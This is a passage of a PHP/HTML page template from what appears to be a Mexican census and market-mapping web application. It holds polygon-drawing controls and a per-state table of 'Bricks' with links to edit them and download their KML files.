                            <a onclick="cerrarCaptura3();" title="cerrar">  <img src="temas/default/_img/no.png" width="38" style="float:left;width: 50%;outline: white solid thin"/></a>
                            </div>
                            <div id="div_boton23" style="display: none; ">
                            <a onclick="" title="Cargando">  <img src="temas/default/_img/loading.gif" width="30" height="39" style="float:left;width: 20%;outline: white solid thin"/></a>
                            </div>
                            
                                <canvas id="canvas3" style="border: 5px solid black; display: none;">
                                </canvas>
                            </div>
                            -->
                         <!--
                         <div class="Pic" id="Pic" style="border: 1px solid red;"></div>
                         -->
                         <?php
                          //}
                          
                          ?>
                         
                    <!-- <a onclick="Bricks();" title="Bricks">
                          <img src="temas/default/_img/bricks.png" width="30" height="39" id="regla"/>                          </a>
                    -->
                     
                  </div>
                         <div id="floating-panel2" style="display:none;">
      <input onclick="clearpuntosRuta();"  type="image" src="temas/default/_img/ocultarruta.png" height="34" width="100" value="Ocultar Markadores">
         <HR color="#FFFFFF" size=1>
      <input onclick="showpuntosRuta();" type="image" src="temas/default/_img/mostrarruta.png"  height="34" width="100" value="Mostrar Marcadores">
                    <HR color="#FFFFFF" size=1>
      <input height="34" width="100"  onclick="deletepuntosRuta();" type="image" src="temas/default/_img/limpiarruta.png" value="Limpiar Ruta">
                     <HR color="#FFFFFF" size=1>
       <input height="34" width="100" onclick="removeruta();" type="image" src="temas/default/_img/cambiarruta.png" value="Cambiar Marcador">

        <h3 style="color: rgb(0,0,0);" align="center"> DISTANCIA</h3>

    <h2 style="color: rgb(0,0,0); background-color: rgba(230,0,0, 0.7);" align="center" id="Disf1" > 0.00</h2>
                  </div>
                </div>
            </div>

<!--           <div style="position:absolute; top:-5px; left:150px;">
            <span><table border="0" width="100%"><tr><td width="350 px" valign="middle" align="left"><p style="font-size:7px;">© D.R. Leonardo Zanatta Barradas y Guillermo Mart&iacute;nez Gallardo Heredia, 2011.<br />© Leonardo Zanatta Barradas and Guillermo Martinez Gallardo Heredia. All rights reserved, 2011.</p></td><td align="center" valign="middle"><a href="https://www.inmega.com" target="new">Inmega 2011 &reg;</a></td></tr></table></span>
           </div>
-->
            <!-- compras paso 1-->
            <div class="contenedorMG" style="position:absolute; top:53px; left:5px;">
                <table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" id="tablaMapa">
                    <tr valign="top">
                        <td id="mostrar_opciones" valign="top" width="18">
                            <br /><a href="#" onclick="mostar()" title="Mostrar Pesta&ntilde;a" ><img src=<?php  if ($dominio=='fa1' or $dominio=='faprueba'){ echo '"' . DIR_TEMA_ACTIVO . '_img/mostrar_'.$dominio.'.png"'; } if ($dominio=='faprueba'){ echo '"' . DIR_TEMA_ACTIVO . '_img/mostrar_'.$dominio.'.png"'; }
              if ($dominio=='demo1' or $dominio=='holcimmx' or $dominio=='materiales'){ echo '"' . DIR_TEMA_ACTIVO . '_img/mostrar_'.$dominio.'.png"'; }
                            else
                            {echo '"' . DIR_TEMA_ACTIVO . '_img/mostrar.png"';
                            }
                            ?> width="18" height="18" alt="Mostrar" /></a>
                        </td>
                        <td width="300" valign="top" id="opciones" style="display:none;" >
                            <div id="cont_opciones">
                                <div id="main_opc">
                                    <span class="help"><a href="#" onclick="ayuda('1')" title="Ayuda" ><img src=<?php if ($dominio=='fa1' or $dominio=='faprueba' or $dominio=='demo1' or $dominio=='holcimmx' or $dominio=='materiales'){echo '"' . DIR_TEMA_ACTIVO . '_img/help_'.$dominio.'.png"'; }
                                    else {echo '"' . DIR_TEMA_ACTIVO . '_img/help.png"';
                                    }
                                    ?> width="33" height="31" alt="Ayuda" /></a></span>
                                    <span class="res" id="opciones_compra_titulo">Generaci&oacute;n de poligono</span>
                                    <span class="ocultar"><a href="#" onclick="opciones_comprar();" title="Ocultar Pesta&ntilde;a" ><img src=<?php if ($dominio=='fa1' or $dominio=='faprueba' or $dominio=='demo1' or $dominio=='holcimmx' or $dominio=='materiales'){echo '"' . DIR_TEMA_ACTIVO . '_img/ocultar_'.$dominio.'.png"';}
                                    else {echo '"' . DIR_TEMA_ACTIVO . '_img/ocultar.png"';}
                                    ?> width="25" height="20" /></a></span>
                                </div>

                                <div style="width:288px; padding-left:3px;"  class="miscompras" id="miscompras3">
                                    <div id="paso1" class="paso" style="margin-left:10px;">
                                        <table border="0" height="100%" id="tablaPaso1">
                                            <tr>
                                                <td valign="top">
                                                    <div align="left">
                                                      <table border="0">
                                                          <tr>
                                                            <!--
                                                              <td>
                                                                  <input type="checkbox" name="mostrarAgebs" id="mostrarAgebs" onclick="document.getElementById( 'mostrarAgebs2' ).checked = document.getElementById( 'mostrarAgebs' ).checked; muestraAgebsPolilinea(polilinea);"/>Poblaci&oacute;n
                                                                </td>
                                                                <td><img style="display:none" class="mostrarAgebsImg" src="' . DIR_TEMA_ACTIVO . '_img/waiting.gif" /></td>
                                                             -->
                                                            </tr>
                                                            <tr>
                                                              <td>
                                                                  <div style="display:none" name="divMostrarEtiquetas" id="divMostrarEtiquetas">
                                                                    <input type="checkbox" name="mostrarEtiquetas" id="mostrarEtiquetas" onclick="muestraAgebsPolilinea(polilinea); resize();" />
                                                                    Mostrar etiquetas&nbsp;&nbsp;&nbsp;<a href="#"  onclick="ayuda('9');">Ver c&oacute;digo de colores</a>
                                                                  </div>
                                                                </td>
                                                            </tr>
                                                        </table>
                                                    </div>
                                                    <div id="accordion" height="750px">
                                                    <?php
                          $color='<font color="green" size="2">Marca en el mapa el &aacute;rea con un clic para cada lado del pol&iacute;gono deseado</font>';
                          $colorkml='<font color="gray" size="2">Selecciona para mostrar los Bricks de cada estado.</font>';
                          $colorNSE='<font color="gray" size="2">Selecciona para mostrar los NSE de cada estado.</font>';
                          $distritos = '<font color="gray" size="2">Selecciona para mostrar los distritos.</font>';
                          $secciones = '<font color="gray" size="2">Selecciona para mostrar las secciones.</font>';


                          if($dominio=='holcimmx' or $dominio=='fa1' or $dominio=='faprueba' or $dominio=='materiales')
                          {
$color='<b><font color="gray" size="2">Marca en el mapa el &aacute;rea con un clic para cada lado del pol&iacute;gono deseado</font></b>';
                          }

                                                          if (!esPyme()){
/*
                                                            echo '<h2><a href="#">Pol&iacute;gono libre</a></h2>
                                                                <div>
                                                                    <div align="center"><font color="green" size="2">Define un pol&iacute;gono irregular con mas de tres vértices</font></div>
                                                                    <ul style="margin-left:-35px;">
                                                                        <li><img src="' . DIR_TEMA_ACTIVO . '_img/04_maps.png" height="20"/> Navega a la localidad deseada. Puedes hacerlo <a href="#" onclick="buscar()">aqu&iacute; </a></li>
                                                                        <li><img src="' . DIR_TEMA_ACTIVO . '_img/lupa.png" height="20"/> Ajusta el acercamiento lo que considere necesario.</li>
                                                                        <li>Dibuja el &aacute;rea haciendo clic sobre el mapa, se dibujara un pol&iacute;gono delimitando el &aacute;rea seleccionada.</li>
                                                                        <li>Seleccionada el &aacute;rea deseada presiona el bot&oacute;n siguiente para avanzar con el proceso de ' .
                                                                  (esCorporativo() ? 'consulta': 'compra') .
                                                                  '</li>
                                                                    </ul>
                                                                                            <!--
                                                                    <div style="margin-left:10px;">
                                                                        <img src="' . DIR_TEMA_ACTIVO . '_img/tip.png" width="20" height="20" align="right"/><font color="green">Si has cometido un error al definir el pol&iacute;gono, presione "Reiniciar".<br><br><br></font>
                                                                    </div>
                                                                                            -->
                                                                    <div align="center">
                                                                        <input type="button" value="Reiniciar" onclick="ActivaPoligono(\'1\')" /><br><br>
                                                                                                <!--<input type="button" value="Editar poligono" onclick="EditarPoligono()" id="btnEditarPoligono" />-->
                                                                    </div>
                                                                    <br><br>
                                                                </div>';


*/
                                                            echo '<h2><a href="#">Pol&iacute;gono libre</a></h2>
                                                                <div>
                                                                    <div align="center">
                                      '.$color.'
                                        <br/>
                                        <input type="button" value="Volver a dibujar" onclick="ActivaPoligono(\'1\')" />
                                        <br /><br /><br /><br />
                                        <img src="' . DIR_TEMA_ACTIVO . '_img/04_maps.png" height="20"/><font size="2">Navega a la localidad deseada. Puedes hacerlo <a href="#" onclick="buscar()">aqu&iacute; </a></font>
                                        <br /><br /><br /><br />
                                        <table>
                                          <tr>
                                            <td>
                                              <font size="2">Activar Poblaci&oacute;n</font>' .
                                              (isset($_SESSION['user']) ? '<input type="checkbox" name="mostrarAgebsL" id="mostrarAgebsL" onclick="document.getElementById( \'mostrarAgebsC\' ).checked = document.getElementById( \'mostrarAgebsL\' ).checked;
                                              document.getElementById( \'mostrarAgebs2\' ).checked = document.getElementById( \'mostrarAgebsL\' ).checked; muestraAgebsPolilinea(polilinea);"/>' :
                                              '<input type="checkbox" name="mostrarAgebsL" id="mostrarAgebsL" onclick="document.getElementById( \'mostrarAgebs2\' ).checked = document.getElementById( \'mostrarAgebsL\' ).checked; muestraAgebsPolilinea(polilinea);"/>' ).
                                              (isset($_SESSION['user']) ? '<input type="checkbox" name="mostrarAgebsLNSE" id="mostrarAgebsLNSE" onclick="document.getElementById( \'mostrarAgebsCNSE\' ).checked = document.getElementById( \'mostrarAgebsLNSE\' ).checked;
                                              document.getElementById( \'mostrarAgebs2NSE\' ).checked = document.getElementById( \'mostrarAgebsLNSE\' ).checked; muestraAgebsPolilineaNSE(polilinea);"/>' :
                                              '<input type="checkbox" name="mostrarAgebsLNSE" id="mostrarAgebsLNSE" onclick="document.getElementById( \'mostrarAgebs2NSE\' ).checked = document.getElementById( \'mostrarAgebsLNSE\' ).checked; muestraAgebsPolilineaNSE(polilinea);"/>' ).
                                            '</td>
                                            <td>
                                              <img style="display:none" class="mostrarAgebsImg" src="' . DIR_TEMA_ACTIVO . '_img/waiting.gif" />
                                            </td>
                                            <td>
                                              <img style="display:none" class="mostrarAgebsImgNSE" src="' . DIR_TEMA_ACTIVO . '_img/waiting.gif" />
                                            </td>
                                          </tr>
                                        </table>
                                        <br /><br /><br />
                                    </div>
                                                              </div>';
if(isset($_SESSION['user'])){
//if ($dominio=='faprueba')
if ($dominio=='faprueba' or $dominio=='fa1')
  {
                                                          echo '<h2><a href="#">Bricks</a></h2>
                                                                <div>
                                                                    <div align="center">
                                      '.$colorkml.'
                                <br>
                                <br>
                                <div class="boxContenedor">
                                <table>
<!-- <a href="#" onclick="ventanaSecundaria();"> dos</a>  -->
                                <!-- <tr><td>
                                <input  type="checkbox" name="btn1" id="btn1" onclick="mostrarKML();" /> Republica Mexicana<br>
                                </td></tr> -->
                                <tr><td>
                                <input  type="checkbox" name="btn4" id="btn4" onclick="printaAguascalientes();" /> Aguascalientes<br></td>
                                <td>
                                <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_aguascalientes.php?ciudad=Aguascalientes"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                </td>
                                <td>
                                <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/aguascalientes.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                </td></tr>
                                </tr>
                                <tr><td>
                                <input  type="checkbox" name="btn5" id="btn5" onclick="printaBajaCal();" /> Baja California<br></td>
                                <td>
                                <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_bajacalifornia.php?ciudad=Baja California"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                </td>
                                <td>
                                <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/bajaCalifornia2.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                </td></tr>
                                <tr><td>
                                <input  type="checkbox" name="btn6" id="btn6" onclick="printaCampeche();" /> Campeche<br></td>
                                <td>
                                <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_campeche.php?ciudad=Campeche"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                </td>
                                <td>
                                <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/campeche2.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                </td></tr>
                                <tr><td>
                                <input  type="checkbox" name="btn2" id="btn2" onclick="printagebs();" /> CDMX <br></td>
                                <td>
                                <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_cdmx.php?ciudad=DISTRITO FEDERAL"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                </td>
                                <td>
                                <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/cdmx_v01.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                </td></tr>
                                <tr><td>
                                <input  type="checkbox" name="btn7" id="btn7" onclick="printaChiapas();" /> Chiapas<br></td>
                                <td>
                                <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_chiapas.php?ciudad=Chiapas"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                </td>
                                <td>
                                <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/chiapas.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                </td></tr>
                                <tr><td>
                                <input  type="checkbox" name="btn8" id="btn8" onclick="printaChihuahua();" /> Chihuahua<br></td>
                                <td>
                                <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_chihuahua.php?ciudad=Chihuahua"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                </td>
                                <td>
                                <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/chihuahua2.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                </td></tr>
                                <tr><td>
                                <input  type="checkbox" name="btn9" id="btn9" onclick="printaCoahuila();" /> Coahuila<br></td>
                                <td>
                                <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_coahuila.php?ciudad=Coahuila"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                </td>
                                <td>
                                <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/coahuila2.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                </td></tr>
                                <tr><td>
                                <input  type="checkbox" name="btn10" id="btn10" onclick="printaColima();" /> Colima<br></td>
                                <td>
                                <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_colima.php?ciudad= Colima"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                </td>
                                <td>
                                <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/colima2.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                </td></tr>
                                <tr><td>
                                <input  type="checkbox" name="btn11" id="btn11" onclick="printaDrurango();" /> Durango<br></td>
                                <td>
                                <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_durango.php?ciudad= Durango"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                </td>
                                <td>
                                <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/durango.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                </td></tr>
                                <tr><td>
                                <input  type="checkbox" name="btn3" id="btn3" onclick="printaEdoMex();" /> Estado de México<br></td>
                                <td>
                                <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_edomex.php?ciudad=Estado de México"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                </td>
                                <td>
                                <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/edo_mex.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                </td></tr>
                                <tr><td>
                                <input  type="checkbox" name="btn12" id="btn12" onclick="printaGuanajuato();" /> Guanajuato<br></td>
                                <td>
                                <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_guanajuato.php?ciudad=Guanajuato"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                </td>
                                <td>
                                <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/guanajuato1.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                </td></tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn13" id="btn13" onclick="printaGuerrero();" /> Guerrero<br>
                                        </td>
                                        <td>
                                            <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_guerrero.php?ciudad= Guerrero"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                        </td>
                                        <td>
                                            <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/guerrero1.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn15" id="btn15" onclick="printaHidalgo();" /> Hidalgo<br>
                                        </td>
                                        <td>
                                            <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_hidalgo.php?ciudad=Hidalgo"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                        </td>
                                        <td>
                                            <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/hidalgo.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn16" id="btn16" onclick="printaJalisco();" /> Jalisco<br>
                                        </td>
                                        <td>
                                            <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_jalisco.php?ciudad=Jalisco"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                        </td>
                                        <td>
                                            <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/jalisco1.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn17" id="btn17" onclick="printaMichoacan();" /> Michoacan<br>
                                        </td>
                                        <td>
                                            <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_michoacan.php?ciudad=Michoacan"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                        </td>
                                        <td>
                                            <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/michoacan1.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn18" id="btn18" onclick="printaMorelos();" /> Morelos<br>
                                        </td>
                                        <td>
                                            <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_morelos.php?ciudad=Morelos"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                        </td>
                                        <td>
                                            <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/morelos2.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn19" id="btn19" onclick="printaNayarit();" /> Nayarit<br>
                                        </td>
                                        <td>
                                            <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_nayarit.php?ciudad=Nayarit"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                        </td>
                                        <td>
                                            <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/nayarit1.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn14" id="btn14" class="btn14" onclick="printaNuevoLeon();" /> Nuevo León<br>
                                        </td>
                                        <td>
                                            <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_nuevoleon.php?ciudad=Nuevo León">
                                                <img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/>
                                            </a>
                                            <br>
                                        </td> 
                                        <td>
                                            <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/nuevoLeon1.kml">
                                                <img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/>
                                            </a>
                                            <br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn20" id="btn20" onclick="printaOaxaca();" /> Oaxaca<br>
                                        </td>
                                        <td>
                                            <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_oaxaca.php?ciudad=Oaxaca"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                        </td>
                                        <td>
                                            <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/oaxaca1.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn21" id="btn21" onclick="printaPuebla();" /> Puebla<br>
                                        </td>
                                        <td>
                                            <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_puebla.php?ciudad=Puebla"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                        </td>
                                        <td>
                                            <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/puebla1.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn22" id="btn22" onclick="printaQueretaro();" /> Queretaro<br>
                                        </td>
                                        <td>
                                            <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_queretaro.php?ciudad=Queretaro"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                        </td>
                                        <td>
                                            <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/queretaro.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn23" id="btn23" onclick="printaQuintanaRoo();" /> Quintana Roo<br>
                                        </td>
                                        <td>
                                            <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_quintanaroo.php?ciudad=Quintana Roo"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                        </td>
                                        <td>
                                            <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/quintanaRoo1.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn24" id="btn24" onclick="printaSanLuis();" /> San Luis Potosi<br>
                                        </td>
                                        <td>
                                            <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_sanluis.php?ciudad=San Luis Potosi"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                        </td>
                                        <td>
                                            <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/sanLuisPotosi1.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn25" id="btn25" onclick="printaSinaloa();" /> Sinaloa<br>
                                        </td>
                                        <td>
                                            <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_sinaloa.php?ciudad=Sinaloa"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                        </td>
                                        <td>
                                            <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/sinaloa1.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn26" id="btn26" onclick="printaSonora();" /> Sonora<br>
                                        </td>
                                        <td>
                                            <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_sonora.php?ciudad=Sonora"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                        </td>
                                        <td>
                                            <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/sonora1.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn27" id="btn27" onclick="printaTabasco();" /> Tabasco<br>
                                        </td>
                                        <td>
                                            <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_tabasco.php?ciudad=Tabasco"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                        </td>
                                        <td>
                                            <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/tabasco.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn28" id="btn28" onclick="printaTamaulipas();" /> Tamaulipas<br>
                                        </td>
                                        <td>
                                            <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_tamaulipas.php?ciudad=Tamaulipas"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                        </td>
                                        <td>
                                            <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/tamaulipas1.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn29" id="btn29" onclick="printaTlaxcala();" /> Tlaxcala<br>
                                        </td>
                                        <td>
                                            <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_tlaxcala.php?ciudad=Tlaxcala"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                        </td>
                                        <td>
                                            <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/tlaxcala1.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn30" id="btn30" onclick="printaVeracruz();" /> Veracruz<br>
                                        </td>
                                        <td>
                                            <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_veracruz.php?ciudad=Veracruz"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                        </td>
                                        <td>
                                            <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/veracruz.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn31" id="btn31" onclick="printaYucatan();" /> Yucatan<br>
                                        </td>
                                        <td>
                                            <a title="Editar Birck" href="https://fa1.censosmkd.com/edita_yucatan.php?ciudad=Yucatan"><img src="https://fa1.censosmkd.com/temas/default/_img/editar.png" alt="Editar Birck" width="20" height="20"/></a><br>
                                        </td>
                                        <td>
                                            <a title="Descargar Brick" href="https://fa1.censosmkd.com/temas/default/kml_faprueba/edit_kml/yucatan1.kml"><img src="https://fa1.censosmkd.com/temas/default/_img/down.png" alt="Descargar Brick" width="20" height="20"/></a><br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn32" id="btn32" onclick="printaZacatecas();" /> Zacatecas<br>
                                        </td>
                                        <td>
